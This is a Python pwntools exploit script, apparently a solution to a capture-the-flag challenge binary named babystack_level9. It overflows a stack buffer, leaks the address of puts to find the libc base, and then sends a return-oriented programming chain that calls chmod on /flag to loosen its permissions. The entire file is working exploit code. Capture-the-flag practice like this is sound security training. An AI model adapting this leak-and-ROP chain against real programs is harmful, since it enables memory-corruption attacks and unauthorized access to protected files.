import pwn
import struct
from pwn import *

def rop_chain(base):
    flag_string = b'/flag\x00ab'
    # From gadgets
    # Use ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop" 
    pop_rdi = p64(base + 0x23b6a)
    pop_rsi = p64(base + 0x2601f)
    permission_code = p64(0x7)
    chmod = p64(base + 0x10db60)

    # Put value of the flag in the buffer first (rbp), then send that value as argument to pop rdi.. then send the permission code to rsi.. finally call chmod syscall
    chain = flag_string + pop_rdi + p64(0x404818) +  pop_rsi + permission_code + chmod
    return chain

def leak():
    # ROPgadget search on the babystack binary
    pop_rdi = 0x401553
    plt_puts = 0x4010d0
    puts_glibc = 0x404020
    read = 0x4014c4
    chain = p64(pop_rdi) + p64(puts_glibc) + p64(plt_puts) + p64(read)
    return chain

io = pwn.process("/challenge/babystack_level9")

# rbp
io.recvuntil("base pointer rbp: ")
rbp = int(io.recvline(keepends=False),16)
print(hex(rbp))

# buff
io.recvuntil("will be stored: ")
buff = int(io.recvline(keepends=False),16)
print(hex(buff))

# Send the first exploit to leak libc
# 0x 4014c4 is the start of read
# 0x404818 is the writable memory address for rbp
exploit = cyclic(rbp - buff) + p64(0x404818) + leak()  
io.sendline(exploit)

io.recvline() 
leaked_bytes = io.recvline(keepends=False)
leaked_puts = u64(leaked_bytes.ljust(8, b"\0"))
print(f"leaked puts: 0x{leaked_puts:x}")

offset_puts = 0x84420
base_libc = leaked_puts - offset_puts

print(f"base of libc: 0x{base_libc:x}")

io.sendline(cyclic(0x530) +rop_chain(base_libc))

io.interactive()